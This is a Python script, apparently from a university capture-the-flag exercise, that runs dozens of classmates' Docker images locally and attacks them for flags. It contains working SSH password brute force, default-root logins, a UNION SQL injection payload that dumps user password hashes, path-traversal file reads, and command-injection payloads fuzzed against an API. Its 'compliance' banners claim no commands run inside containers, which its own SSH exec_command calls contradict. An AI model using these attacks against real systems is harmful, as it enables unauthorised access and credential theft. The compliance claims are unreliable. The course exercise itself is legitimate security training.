#!/usr/bin/env python3
"""
Network-Only Docker Image Attack Script for CTF Flag Hunting
Author: Offensive Security Team
Purpose: Automated penetration testing for Phase 3 - IntSec 2025
Compliance: Network-based attacks only (no direct container interaction)
IMPORTANT: This script does NOT run any commands inside containers
"""

import docker
import re
import os
import sys
import json
import time
import requests
import threading
import concurrent.futures
from datetime import datetime
import platform
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Detect OS
IS_WINDOWS = platform.system() == 'Windows'

# Color codes for output
class Colors:
    if IS_WINDOWS:
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except:
            pass

    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Target images
TARGET_IMAGES = [
     "elnino/intsec-2025:hardened-v2",
    "kv1st3n/passoire_final:latest",
    "albinheldebro/passoire_final:latest",
    "arsadraei/passoire_hardened:final",
    "akra9743/hardened-passoire:latest",
    "qilu2001/passoire-hardened:phase2",
    "cait7999/passoire-hardened:latest",
    "tiagomiguel29/hardened-passoire:latest",
    "bhanukac/group_27_intsec:v6",
    "emadetemad/passoire_hardened:latest",
    "viqingo/passoire-hardened-group34:latest",
    "aw950309/passoire:v4",
     "aw950309/passoire:v1",
    "taro0510/passoire_36:v5",
    "maple1058/42_final_image:v1",
    "galaldh/passoire:hardened",
    "tomej2/group50repository:latest",
    "hampusbosson/grupp60_intsec:v3",
    "carmencanedo/intsec:passoire-final",
    "intsecgroup3/group3-app-image:v2.0",
    "lindaelize/passoire-merged:latest",
    "wallowa/passoire-intsec:latest",
    "emrenebiler/passoire_gr7:latest",
    "tylerponte/intsec:intsec-group8",
    "mikaellw/projectgroup9:latest",
    "theorjiugovictor/passoire:group10-v9",
    "rosella25/project_passoire:group_12",
    "chabsieger/passoire-secure:v1",
    "mellowcube/passoire-group18-modified:v1.0.0",
    "smariful/passoire-secure:v2",
    "aimo2926/passoire-hardened:v1",
    "huzaifa7470/group19_passoire_hardened:latest",
    "uthpalavi/passoire20-secure:v1",
    "thlak/group_23_passoire:modified",
    "gabbipls/new-passoire-intsec25:phase2",
    "deadbacteria8/passoire-grupp:latest",
    "hcipher/hardened-image:v3",
    "codyprince/test:latest",
    "shoveltime/passoire_group30_public:latest",
    "shahidalvit/passoire-hardened-by-group32:latest",
    "ichigoku/passoire:grupp33-v5",
    "martijnme/intro-sec-group-37:v1.1.7",
    "hiramlopez/passoire-38-v2:from-github",
    "kali6753/passoire:NEW",
    "madli/passoire:hardened",
    "fabiopereira98/project_group52:final",
    "hanjoh/group55:improved3",
    "askanberg/grupp57:v3",
    "g62intsec/g62intsec-public:latest",
    "alexkord/saferpoint:latest",
    "gl767077147/passoire-group-66:latest",
    "shamelwaseem/intsec_67:1.0",
    "intsec25group68/phase_2:final",
    "georgiosekapsas/intsec_group_69:v3",
]

# Flag patterns
# Flag patterns - one for each flag (1-14)
FLAG_PATTERNS = [r'flag_{}\s+is\s+([a-fA-F0-9]{{32,128}})'.format(i) for i in range(1, 15)]
# Also add a universal pattern to catch any flag_X format
UNIVERSAL_FLAG_PATTERN = r'flag_(\d+)\s+is\s+([a-fA-F0-9]{32,128})'

# Ignored false positives (default flags or common hashes)
IGNORED_FLAGS = {
    '0654a0823c2015b72407132de1940cbf',          # MD5 of "flag" (Default placeholder)
    '0654a0823c2015b72407132de1940cbf94404434',  # Common artifact/placeholder
    'd41d8cd98f00b204e9800998ecf8427e',          # MD5 of empty string
}

# Global results storage
all_results = []
global_lock = threading.Lock()

def log(message, level="INFO"):
    """Enhanced logging with colors"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    colors = {
        "INFO": Colors.OKBLUE,
        "SUCCESS": Colors.OKGREEN,
        "WARNING": Colors.WARNING,
        "ERROR": Colors.FAIL,
        "FLAG": Colors.OKCYAN + Colors.BOLD
    }
    color = colors.get(level, Colors.ENDC)
    print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}", flush=True)

def save_flag(flag_value, method, image_name, comment="", flag_num=None):
    """Save discovered flag (thread-safe) with optional explicit flag number"""
    with global_lock:
        # Check if this flag was already found for this image
        for result in all_results:
            if result["image"] == image_name and result["flag_value"] == flag_value:
                return

        # Use provided flag_num or calculate sequentially
        if flag_num is None:
            image_flags = [r for r in all_results if r["image"] == image_name]
            flag_num = len(image_flags) + 1

        result = {
            "flag_number": flag_num,
            "flag_value": flag_value,
            "discovery_method": method,
            "image": image_name,
            "comment": comment,
            "timestamp": datetime.now().isoformat()
        }
        all_results.append(result)

        log(f"🚩 FLAG #{flag_num} FOUND in {image_name}: {flag_value}", "FLAG")
        log(f"   Method: {method}", "FLAG")
        if comment:
            log(f"   Comment: {comment}", "FLAG")

def search_for_flags(text, image_name, method, context="", expected_flag=None):
    """Search text for specific flag patterns (flag_1 is, flag_2 is, etc.)"""
    if not text:
        return []

    found_flags = []
    text_str = str(text)

    # Use universal pattern to find any flag_X format
    try:
        matches = re.finditer(UNIVERSAL_FLAG_PATTERN, text_str, re.IGNORECASE | re.MULTILINE)
        for match in matches:
            flag_num = int(match.group(1))  # Extract actual flag number
            flag_hash = match.group(2).strip()  # Extract hash value

            # Skip ignored flags
            if flag_hash in IGNORED_FLAGS:
                continue

            # If expected_flag is set, only accept that specific flag
            if expected_flag is not None and flag_num != expected_flag:
                continue

            flag_value = f"flag_{flag_num} is {flag_hash}"
            save_flag(flag_value, method, image_name, context, flag_num=flag_num)
            found_flags.append((flag_num, flag_hash))
    except Exception as e:
        log(f"Error searching for flags: {str(e)[:50]}", "ERROR")

    return found_flags

def pull_image(client, image_name):
    """Pull Docker image if not present"""
    try:
        log(f"Checking/pulling {image_name}...")
        try:
            client.images.get(image_name)
            log(f"✓ Image {image_name} already exists", "SUCCESS")
            return True
        except docker.errors.ImageNotFound:
            log(f"Pulling {image_name}...")

            try:
                client.images.pull(image_name)
                log(f"✓ Successfully pulled {image_name}", "SUCCESS")
                return True
            except Exception as e:
                log(f"✗ Failed to pull {image_name}: {str(e)[:100]}", "ERROR")
                return False
    except Exception as e:
        log(f"✗ Error with {image_name}: {str(e)[:100]}", "ERROR")
        return False

def analyze_image_metadata(client, image_name):
    """
    COMPLIANT: Analyze image metadata and layers (static analysis)
    This does NOT run any commands in containers
    """
    log(f"🔍 Analyzing image metadata for {image_name}...")

    try:
        image = client.images.get(image_name)

        # Check image history (this is metadata, not running container)
        history = image.history()
        for idx, layer in enumerate(history):
            created_by = layer.get('CreatedBy', '')
            if created_by:
                search_for_flags(created_by, image_name, "Docker Image Layer Analysis",
                                 f"Found in layer {idx} command: {created_by[:50]}...")

        # Check configuration
        config = image.attrs.get('Config', {})

        # Environment variables (metadata only)
        env_vars = config.get('Env', [])
        for env in env_vars:
            search_for_flags(env, image_name, "Docker Environment Variables",
                             f"Env var: {env}")

        # Labels (metadata only)
        labels = config.get('Labels', {})
        if labels:
            for key, value in labels.items():
                search_for_flags(f"{key}={value}", image_name, "Docker Image Labels",
                                 f"Label {key}={value}")

        # Command and Entrypoint (metadata only)
        cmd = config.get('Cmd', [])
        entrypoint = config.get('Entrypoint', [])
        if cmd:
            search_for_flags(str(cmd), image_name, "Docker CMD", f"CMD: {str(cmd)[:50]}")
        if entrypoint:
            search_for_flags(str(entrypoint), image_name, "Docker ENTRYPOINT",
                             f"ENTRYPOINT: {str(entrypoint)[:50]}")

        # Working directory (metadata only)
        workdir = config.get('WorkingDir', '')
        if workdir:
            search_for_flags(workdir, image_name, "Docker Working Directory",
                             f"WorkingDir: {workdir}")

        log(f"✓ Metadata analysis complete for {image_name}", "SUCCESS")

    except Exception as e:
        log(f"✗ Metadata analysis error: {str(e)[:100]}", "ERROR")

def test_web_endpoint(port, image_name, method, path, headers, timeout=2):
    """Test a single web endpoint via network only"""
    try:
        url = f"http://localhost:{port}{path}"

        if method == 'GET':
            response = requests.get(url, timeout=timeout, headers=headers, verify=False)
        elif method == 'POST':
            response = requests.post(url, timeout=timeout, data={},
                                     headers=headers, verify=False)
        else:
            return False

        if response.status_code < 500:
            # Search for flags in response
            # DEBUG: Print what's being matched (kept for debugging, but won't save to report if ignored)
            text = response.text
            for pattern in FLAG_PATTERNS:
                matches = re.findall(pattern, text, re.IGNORECASE)
                for m in matches:
                    if '0654a0823c2015b72407132de1940cbf' in m:
                        # This will still print to console so you know it's there,
                        # but search_for_flags will ignore it for the report
                        log(f"DEBUG: Found default flag {m} in response from {url}", "WARNING")

            search_for_flags(response.text, image_name, "HTTP Response",
                             f"{method} {path} (Port {port}) - Status: {response.status_code}")

            # Search in headers
            header_str = str(response.headers)
            search_for_flags(header_str, image_name, "HTTP Headers",
                             f"Headers from {method} {path} (Port {port})")

            # Check for HTML comments
            if '<!--' in response.text:
                comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
                for comment in comments:
                    search_for_flags(comment, image_name, "HTML Comment",
                                     f"Comment from {path} (Port {port})")

            return True
    except requests.exceptions.ConnectionError:
        pass
    except Exception:
        pass

    return False

def network_attack_container(client, image_name):
    """Run container and execute compartmentalized attacks"""
    log(f"🚀 Starting container for attacks: {image_name}...")

    container = None
    try:
        container = client.containers.run(
            image_name,
            detach=True,
            ports={
                '22/tcp': None,
                '80/tcp': None,
                '443/tcp': None,
                '3000/tcp': None,
                '3001/tcp': None,
                '3002/tcp': None,
                '5000/tcp': None,
                '8080/tcp': None,
            },
            remove=False,
            auto_remove=False,
            mem_limit='512m',
        )

        log(f"Container started (ID: {container.short_id}), waiting...")
        time.sleep(10)

        container.reload()
        ports_info = container.attrs['NetworkSettings'].get('Ports', {})

        port_mappings = {}
        for container_port, host_bindings in ports_info.items():
            if host_bindings:
                port_mappings[container_port] = int(host_bindings[0]['HostPort'])
                log(f"Port mapping: {container_port} -> {port_mappings[container_port]}")

        attack_all_flags(image_name, port_mappings)

        log(f"✓ Compartmentalized attacks complete for {image_name}", "SUCCESS")

    except Exception as e:
        log(f"✗ Attack error: {str(e)[:200]}", "ERROR")
    finally:
        if container:
            try:
                container.stop(timeout=3)
                container.remove()
            except:
                pass

def attack_single_image(client, image_name):
    """Attack single image with compliant techniques only"""
    log(f"\n{'='*70}", "INFO")
    log(f"🎯 ATTACKING: {image_name}", "INFO")
    log(f"{'='*70}", "INFO")

    # Reset flag counter for this image
    log(f"Flag counter reset for {image_name}", "INFO")

    if not pull_image(client, image_name):
        log(f"Skipping {image_name} - could not pull", "WARNING")
        return

    try:
        # PHASE 1: Static metadata analysis (compliant - no container execution)
        #analyze_image_metadata(client, image_name)

        # PHASE 2: Network-only attacks (compliant - only via network)
        network_attack_container(client, image_name)

        # Count flags found for this specific image
        image_flags = [r for r in all_results if r["image"] == image_name]
        log(f"✓ Completed attacking {image_name} - Found {len(image_flags)} flags", "SUCCESS")

    except Exception as e:
        log(f"✗ Error attacking {image_name}: {str(e)[:200]}", "ERROR")

def save_comprehensive_results():
    """Save comprehensive results including method details"""
    if not all_results:
        log("No flags found to save", "WARNING")
        return

    # Group results by image
    images_dict = {}
    for result in all_results:
        image_name = result["image"]
        if image_name not in images_dict:
            images_dict[image_name] = []
        images_dict[image_name].append(result)

    # Save detailed JSON
    with open('ctf_flags_detailed.json', 'w', encoding='utf-8') as f:
        json.dump({
            "total_flags": len(all_results),
            "images_scanned": len(images_dict),
            "flags_by_image": images_dict,
            "scan_timestamp": datetime.now().isoformat()
        }, f, indent=2, ensure_ascii=False)

    # Save simplified CSV format
    with open('ctf_flags_summary.csv', 'w', encoding='utf-8') as f:
        f.write("Image,Flag#,Flag Value,Discovery Method,Comment,Timestamp\n")
        for result in all_results:
            # Clean values for CSV
            flag_val = result['flag_value'].replace('"', '""')
            image_name = result['image'].replace('"', '""')
            method = result['discovery_method'].replace('"', '""')
            comment = result.get('comment', '').replace('"', '""').replace('\n', ' ')

            f.write(f'"{image_name}",{result["flag_number"]},"{flag_val}","{method}","{comment}",{result["timestamp"]}\n')

    # Save markdown report
    with open('ctf_report.md', 'w', encoding='utf-8') as f:
        f.write("# CTF Flag Hunting Report - Phase 3 IntSec 2025\n\n")
        f.write(f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"**Total Flags Found:** {len(all_results)}\n")
        f.write(f"**Images Scanned:** {len(images_dict)}\n\n")
        f.write(f"**Compliance:** Network-only attacks (no container command execution)\n\n")

        f.write("## Summary by Image\n\n")
        for image_name, flags in images_dict.items():
            f.write(f"### {image_name}\n")
            f.write(f"- **Flags Found:** {len(flags)}\n")
            for flag in flags:
                f.write(f"  - Flag #{flag['flag_number']}: `{flag['flag_value']}` ({flag['discovery_method']})\n")
            f.write("\n")

        f.write("## Detailed Flag List\n\n")
        f.write("| # | Image | Flag # | Flag Value | Discovery Method | Comment |\n")
        f.write("|---|-------|--------|------------|------------------|---------|\n")

        global_counter = 1
        for image_name, flags in images_dict.items():
            image_short = image_name.split('/')[-1].split(':')[0]
            for flag in flags:
                flag_val = flag['flag_value']
                if len(flag_val) > 30:
                    flag_val = flag_val[:27] + "..."

                comment = flag.get('comment', '')
                if len(comment) > 40:
                    comment = comment[:37] + "..."

                f.write(f'| {global_counter} | {image_short} | {flag["flag_number"]} | `{flag_val}` | {flag["discovery_method"]} | {comment} |\n')
                global_counter += 1

# Flag-specific attack functions

def attack_flag_1(port_mappings, image_name):
    """Flag 1: SSH Brute Force"""
    log(f"🔐 Attempting Flag 1 (SSH) for {image_name}...")

    ssh_port = port_mappings.get('22/tcp')
    if not ssh_port:
        log("No SSH port mapped, skipping Flag 1", "WARNING")
        return

    try:
        import paramiko
        import logging
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)

        from utils import get_common_passwords
        passwords = get_common_passwords(verbose=False)

        priority_users = ['passoire', 'root']

        for username in priority_users:
            log(f"Testing {username} with {len(passwords)} passwords...", "INFO")
            start_time = time.time()

            for idx, password in enumerate(passwords):
                if try_ssh_login(ssh_port, username, password, image_name, expected_flag=1):
                    elapsed = time.time() - start_time
                    log(f"✓ Found password for {username} after {idx+1} attempts in {elapsed:.2f}s", "SUCCESS")
                    return

            elapsed = time.time() - start_time
            log(f"Tried {len(passwords)} passwords for {username} in {elapsed:.2f}s (~{len(passwords)/elapsed:.1f} attempts/sec)", "INFO")

    except ImportError:
        log("paramiko not installed", "WARNING")

def try_ssh_login(port, username, password, image_name, expected_flag):
    """Helper to attempt SSH login and check for flag"""
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect('localhost', port=int(port), username=username,
                       password=password, timeout=5, banner_timeout=10)
        stdin, stdout, stderr = client.exec_command(f'cat /home/{username}/flag_{expected_flag} /root/flag_{expected_flag}')
        output = stdout.read().decode()
        client.close()
        if output:
            log(f"✓ SSH login successful: {username}:{password}", "SUCCESS")
            search_for_flags(output, image_name, "SSH Brute Force",
                             f"User: {username}", expected_flag=expected_flag)
            return True
    except:
        pass
    return False

def attack_flag_2(port_mappings, image_name):
    """Flag 2: SSH to root - Location: /root/flag_2"""
    log(f"🔐 Attempting Flag 2 (SSH root) for {image_name}...")

    ssh_port = port_mappings.get('22/tcp')
    if not ssh_port:
        log("No SSH port mapped, skipping Flag 2", "WARNING")
        return

    credentials = [('root', 'root'), ('root', 'password'), ('root', 'admin')]

    try:
        import paramiko
        import logging
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)

        for username, password in credentials:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect('localhost', port=int(ssh_port), username=username,
                               password=password, timeout=5)
                stdin, stdout, stderr = client.exec_command('cat /root/flag_2')
                output = stdout.read().decode()
                client.close()
                if output:
                    search_for_flags(output, image_name, "SSH Root Access",
                                    f"User: {username}", expected_flag=2)
                    return
            except:
                pass
    except ImportError:
        log("paramiko not installed", "WARNING")

def attack_flag_5(port_mappings, image_name):
    """Flag 5: SQL Injection - Database: passoire, Table: users"""
    log(f"💉 Attempting Flag 5 (SQL Injection) for {image_name}...")

    http_port = port_mappings.get('80/tcp') or port_mappings.get('8080/tcp')
    if not http_port:
        for p in port_mappings.values():
            if p:
                http_port = p
                break

    if not http_port:
        log("No HTTP port mapped, skipping Flag 5", "WARNING")
        return

    paths = ["/passoire/index.php", "/index.php", "/web/index.php"]

    sqli_payloads = [
        "' UNION SELECT 1,CONCAT(login,':',pwhash),NOW(),login,'x' FROM users-- -",
    ]

    for path in paths:
        for payload in sqli_payloads:
            try:
                url = f"http://localhost:{http_port}{path}"
                response = requests.get(url, params={'filter': payload}, timeout=3)

                if response.status_code == 200:
                    # Match flag_X:hash format (SQLi output)
                    for match in re.finditer(r'(flag_(\d+)):([a-fA-F0-9]{32,128})', response.text):
                        flag_num = int(match.group(2))
                        flag_val = match.group(3)
                        save_flag(flag_val, "SQL Injection", image_name, f"Found via SQLi at {path}", flag_num=flag_num)

                    # Also try standard format
                    search_for_flags(response.text, image_name, "SQL Injection", f"Payload at {path}", expected_flag=5)
                    return
            except:
                pass



def probe_crypto_helper(port_mappings, image_name):
    """Probe all ports to find crypto-helper service"""
    log(f"🔍 Probing for crypto-helper service...")

    # Get all mapped ports
    all_ports = [p for p in port_mappings.values() if p]

    # Crypto-helper specific paths
    discovery_paths = ['/', '/flag', '/encrypt', '/decrypt', '/health', '/api']

    for port in all_ports:
        for path in discovery_paths:
            try:
                url = f"http://localhost:{port}{path}"
                resp = requests.get(url, timeout=2)

                # Check if response looks like crypto-helper
                if resp.status_code < 500:
                    text = resp.text.lower()
                    if any(kw in text for kw in ['crypto', 'encrypt', 'decrypt', 'flag_9', 'flag']):
                        log(f"  ✓ Found crypto-helper on port {port} at {path}", "SUCCESS")
                        return port
            except:
                pass

    log(f"  ✗ Crypto-helper not found on any port", "WARNING")
    return None

def attack_flag_9(port_mappings, image_name):
    """
    Flag 9: Crypto-Helper API file read vulnerability
    Target: /passoire/crypto-helper/flag_9
    """
    log(f"🔌 Attempting Flag 9 (Crypto-Helper file read/injection) for {image_name}...")

    # Try standard crypto-helper ports first
    crypto_ports = []
    for p in ['3000/tcp', '3001/tcp', '3002/tcp']:
        if port_mappings.get(p):
            crypto_ports.append(port_mappings.get(p))

    # If no standard ports, probe all
    if not crypto_ports:
        p = probe_crypto_helper(port_mappings, image_name)
        if p: crypto_ports.append(p)

    if not crypto_ports:
        log("No crypto-helper port found, skipping Flag 9", "WARNING")
        return

    # Expanded target list for LFI
    targets = [
        "/passoire/crypto-helper/flag_9",
        "flag_9",
        "../flag_9",
        "../../flag_9",
        "../../../passoire/crypto-helper/flag_9",
        "./flag_9"
    ]

    # Command injection payloads (common in these challenges)
    cmd_injection = [
        "; cat /passoire/crypto-helper/flag_9",
        "| cat /passoire/crypto-helper/flag_9",
        " && cat /passoire/crypto-helper/flag_9",
        "`cat /passoire/crypto-helper/flag_9`",
        "$(cat /passoire/crypto-helper/flag_9)",
        "; grep -r flag_9 /passoire/crypto-helper"
    ]

    # Expanded endpoints and parameters to fuzz
    # Many challenges use 'filename' instead of 'file'
    fuzz_configs = [
        # (endpoint, param_name)
        ('/encrypt', 'file'),
        ('/encrypt', 'filename'),
        ('/encrypt', 'path'),
        ('/hash', 'file'),
        ('/hash', 'filename'),
        ('/hash', 'string'),
        ('/api/hash', 'file'),
        ('/api/hash', 'filename'),
        ('/api/encrypt', 'file'),
        ('/api/encrypt', 'filename'),
        ('/decrypt', 'file'),
        ('/sign', 'keyFile'),
        ('/verify', 'keyFile'),
        ('/read', 'path'),
        ('/read', 'file')
    ]

    for port in crypto_ports:
        base_url = f"http://localhost:{port}"
        log(f"  Fuzzing crypto-helper on port {port}...", "INFO")

        # 1. Try File Read / LFI
        for endpoint, param in fuzz_configs:
            for target in targets:
                try:
                    url = f"{base_url}{endpoint}"
                    # Try with and without algorithm param
                    payloads = [
                        {param: target},
                        {param: target, 'algorithm': 'md5'},
                        {param: target, 'alg': 'sha256'}
                    ]

                    for json_data in payloads:
                        resp = requests.post(url, json=json_data, timeout=1)
                        if resp.status_code < 500:
                            search_for_flags(resp.text, image_name, "Crypto-Helper LFI",
                                           f"POST {endpoint} {json_data}", expected_flag=9)
                except:
                    pass

        # 2. Try Command Injection
        for endpoint, param in fuzz_configs:
            for cmd in cmd_injection:
                try:
                    url = f"{base_url}{endpoint}"
                    json_data = {param: cmd, 'algorithm': 'md5'}
                    resp = requests.post(url, json=json_data, timeout=1)

                    if resp.status_code < 500:
                        search_for_flags(resp.text, image_name, "Crypto-Helper Cmd Injection",
                                       f"POST {endpoint} {json_data}", expected_flag=9)
                except:
                    pass

    log(f"  ✓ Flag 9 attack complete", "SUCCESS")
def attack_flag_10(port_mappings, image_name):
    """Flag 10: API Exploitation - POST /flag on crypto-helper (port 3002)"""
    log(f"🔌 Attempting Flag 10 (API) for {image_name}...")

    api_ports = [port_mappings.get('3002/tcp'), port_mappings.get('3000/tcp')]
    api_ports = [p for p in api_ports if p] or [3002, 3001, 3000]

    for port in api_ports:
        try:
            url = f"http://localhost:{port}/flag"
            response = requests.post(url, json={}, timeout=5)
            if response.status_code == 200:
                search_for_flags(response.text, image_name, "API Exploitation",
                                f"POST /flag on port {port}", expected_flag=10)
                return
        except requests.exceptions.ConnectionError:
            pass
        except Exception as e:
            log(f"API error on port {port}: {str(e)[:50]}", "WARNING")


def attack_all_flags(image_name, port_mappings):
    """
    Orchestrate attacks for all flags in order
    """
    log(f"🎯 Starting compartmentalized flag attacks for {image_name}...")

    # Define attack order (flags we haven't found yet)

    flag_attacks = [
        # (1, attack_flag_1),
        # (2, attack_flag_2),
        # (3, attack_flag_3),   # Implement when strategy known
        (5, attack_flag_5),
        # (8, attack_flag_8),   # Implement when strategy known
        # (9, attack_flag_9),   # Implement when strategy known
        #(9, attack_flag_9),
        #(10, attack_flag_10),
        # (11, attack_flag_11), # Implement when strategy known
        # (13, attack_flag_13), # Implement when strategy known
        # (14, attack_flag_14), # Implement when strategy known
    ]

    for flag_num, attack_func in flag_attacks:
        try:
            log(f"--- Attempting Flag {flag_num} ---", "INFO")
            attack_func(port_mappings, image_name)
        except Exception as e:
            log(f"Error attacking flag {flag_num}: {str(e)[:100]}", "ERROR")

def main():
    """Main orchestration"""
    print(f"{Colors.OKGREEN}{'='*80}{Colors.ENDC}")
    print(f"{Colors.BOLD}🔥 COMPLIANT DOCKER CTF ATTACK SCRIPT (NETWORK-ONLY) 🔥{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Phase 3: Network-Only Attacks - IntSec 2025{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Platform: {platform.system()} {platform.machine()}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Total targets: {len(TARGET_IMAGES)}{Colors.ENDC}")
    print(f"{Colors.WARNING}⚠️  COMPLIANCE: Network attacks only - NO direct container interaction{Colors.ENDC}")
    print(f"{Colors.WARNING}⚠️  No commands executed inside containers - Only network communication{Colors.ENDC}")
    print(f"{Colors.OKGREEN}{'='*80}{Colors.ENDC}\n")

    # Compliance check
    log("COMPLIANCE CHECK: This script only performs:", "INFO")
    log("  1. Static image metadata analysis (compliant)", "INFO")
    log("  2. Network-based attacks via HTTP (compliant)", "INFO")
    log("  3. NO commands executed inside containers (compliant)", "INFO")
    print()

    try:
        client = docker.from_env()
        log("✓ Docker client initialized", "SUCCESS")
        client.ping()
        log("✓ Docker daemon is running", "SUCCESS")
    except Exception as e:
        log(f"✗ Failed to initialize Docker: {str(e)}", "ERROR")
        log("Make sure Docker Desktop is running!", "ERROR")
        if IS_WINDOWS:
            input("Press Enter to exit...")
        sys.exit(1)

    start_time = time.time()
    images_processed = 0

    # Attack each image
    for idx, image_name in enumerate(TARGET_IMAGES, 1):
        try:
            log(f"\n[{idx}/{len(TARGET_IMAGES)}] Processing {image_name}...", "INFO")
            attack_single_image(client, image_name)
            images_processed += 1

            # Save intermediate results after each image
            if all_results:
                with open('ctf_flags_detailed.json', 'w', encoding='utf-8') as f:
                    json.dump({
                        "total_flags": len(all_results),
                        "images_scanned": idx,
                        "scan_timestamp": datetime.now().isoformat(),
                        "flags": all_results
                    }, f, indent=2, ensure_ascii=False)

            # Brief pause between images to avoid overwhelming the system
            if idx < len(TARGET_IMAGES):
                time.sleep(2)

        except KeyboardInterrupt:
            log("Attack interrupted by user", "WARNING")
            break
        except Exception as e:
            log(f"✗ Fatal error processing {image_name}: {str(e)[:200]}", "ERROR")

    elapsed_time = time.time() - start_time

    # Save final results
    save_comprehensive_results()

    # Final output
    print(f"\n{Colors.OKGREEN}{'='*80}{Colors.ENDC}")
    print(f"{Colors.BOLD}🏆 ATTACK SUMMARY 🏆{Colors.ENDC}")
    print(f"{Colors.OKGREEN}{'='*80}{Colors.ENDC}")
    log(f"Time elapsed: {elapsed_time/60:.2f} minutes", "INFO")
    log(f"Images processed: {images_processed}/{len(TARGET_IMAGES)}", "INFO")

    # Group results by image for display
    images_dict = {}
    for result in all_results:
        image_name = result["image"]
        if image_name not in images_dict:
            images_dict[image_name] = []
        images_dict[image_name].append(result)

    if all_results:
        log(f"🎉 Total flags found: {len(all_results)} across {len(images_dict)} images 🎉", "SUCCESS")

        print(f"\n{Colors.OKGREEN}{'='*80}{Colors.ENDC}")
        print(f"{Colors.BOLD}{'Image':<30} {'Flags':<8} {'Sample Flag'}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}{'='*80}{Colors.ENDC}")

        for image_name, flags in images_dict.items():
            image_short = image_name.split('/')[-1].split(':')[0]
            if len(image_short) > 28:
                image_short = image_short[:25] + "..."

            sample_flag = flags[0]['flag_value']
            if len(sample_flag) > 40:
                sample_flag = sample_flag[:37] + "..."

            print(f"{Colors.OKCYAN}{image_short:<30}{Colors.ENDC} {len(flags):<8} {sample_flag}")

        print(f"{Colors.OKGREEN}{'='*80}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}✓ Results saved to:{Colors.ENDC}")
        print(f"  {Colors.BOLD}- ctf_flags_detailed.json{Colors.ENDC} (complete data)")
        print(f"  {Colors.BOLD}- ctf_flags_summary.csv{Colors.ENDC} (CSV format)")
        print(f"  {Colors.BOLD}- ctf_report.md{Colors.ENDC} (markdown report)")

        # Show compliance confirmation
        print(f"\n{Colors.OKGREEN}✓ Compliance confirmed:{Colors.ENDC}")
        print(f"  {Colors.OKBLUE}• No commands executed inside containers{Colors.ENDC}")
        print(f"  {Colors.OKBLUE}• Only network-based attacks performed{Colors.ENDC}")
        print(f"  {Colors.OKBLUE}• Flag numbering reset for each image{Colors.ENDC}")
    else:
        log("⚠️  No flags found", "WARNING")

    print(f"\n{Colors.OKGREEN}✓ Network-only attack completed successfully!{Colors.ENDC}\n")
    if IS_WINDOWS:
        input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("\n⚠️  Attack interrupted by user", "WARNING")
        if all_results:
            save_comprehensive_results()
            log(f"Saved {len(all_results)} flags found so far", "INFO")
        if IS_WINDOWS:
            input("Press Enter to exit...")
        sys.exit(0)
    except Exception as e:
        log(f"✗ Fatal error: {str(e)}", "ERROR")
        import traceback
        traceback.print_exc()
        if IS_WINDOWS:
            input("Press Enter to exit...")
        sys.exit(1)